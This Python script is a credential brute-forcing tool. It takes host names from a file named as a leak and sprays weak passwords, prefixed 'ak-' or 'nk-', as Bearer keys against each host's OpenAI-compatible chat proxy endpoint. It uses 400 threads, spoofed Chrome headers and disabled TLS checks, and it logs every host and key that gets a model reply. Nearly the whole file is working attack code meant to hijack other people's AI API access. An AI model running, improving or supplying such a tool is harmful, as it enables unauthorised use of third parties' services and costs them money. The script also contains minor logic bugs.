import requests
import concurrent.futures
import re

valid_urls = []


def check_url(url, key):
    try:
        second_headers = {
            "Authority": url,
            "Method": "POST",
            "Path": "/api/openai/v1/chat/completions",
            "Scheme": "https",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
           "Authorization": f"Bearer {key}",
            "Origin": "https://" + url,
            "Path": "v1/chat/completions",
            "Referer": "https://" + url,
            "Sec-Ch-Ua": '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"macOS"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        }
        second_data = {
            "messages": [{"role": "user", "content": "SAY ALOHA. ONLY SAY ALOHA."}],
            "model": "gpt-3.5-turbo-16k",
            "temperature": 0.5,
            "presence_penalty": 0,
        }
        resp = requests.post(
            "https://" + url + "/api/openai/v1/chat/completions",
            headers=second_headers,
            json=second_data,
            stream=True,
            timeout=20,
            verify=False,
        )
        if resp.text != "":
            if resp.text[0].lower() == "a":
                print(resp.text)
                return url
            else:
                resp_data = resp.json()
                if (
                    isinstance(resp_data, dict)
                    and resp_data.get("choices")
                    and resp_data["choices"][0].get("message")
                ):
                    print("valid thing")
                    print(resp.text)
                    return url
                else:
                    print(
                        f"Skipped {url} - The response text does not start with 'H' or 'h', but with:\n{resp.text}"
                    )
    except requests.exceptions.RequestException as e:
        print(f"Failed to establish a connection for {url}: {e}")


urls_found = []
with open("api-vortex-leak.txt", "r") as file:
    urls_found = [line.strip() for line in file]
    for line in file:
        url_pattern = re.compile(r"\b(?:https?://)?(?:(?:www\.)?(?:[\da-z.-]+\.[a-z]{2,6})|(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))(?:[^\s]*)?\b")
        match = url_pattern.search(line)
        if match:
            url = match.group(0)
            url = url.replace("https://", "")
            # Add the modified URL to the list
            urls_found.append(url)


keys = [
            1,
            12,
            1234,
            12345,
            123456,
            1234567,
            12345678,
            123456789,
            654321,
            987654321,
            123654,
            123654789,
            "a123",
            "a123456",
            "@123456",
            321,
            654123,
            "admin",
            "!123456",
            "123456&",
            "!@#$%^",
        ]
prefixes =["ak","nk"]
for prefix in prefixes:
    for key in keys:
        # Create a ThreadPoolExecutor
        with concurrent.futures.ThreadPoolExecutor(max_workers=400) as executor:
            # Use the executor to map the function to the URLs
            future_to_url = {executor.submit(check_url, url, f"{prefix}-{str(key)}"): url for url in urls_found}
            for future in concurrent.futures.as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result()
                except Exception as exc:
                    print(f"{url} generated an exception: {exc}")
                else:
                    if result is not None:
                        valid_urls.append(f"{result},{key}")

print("Valid URLs:")
print(valid_urls)
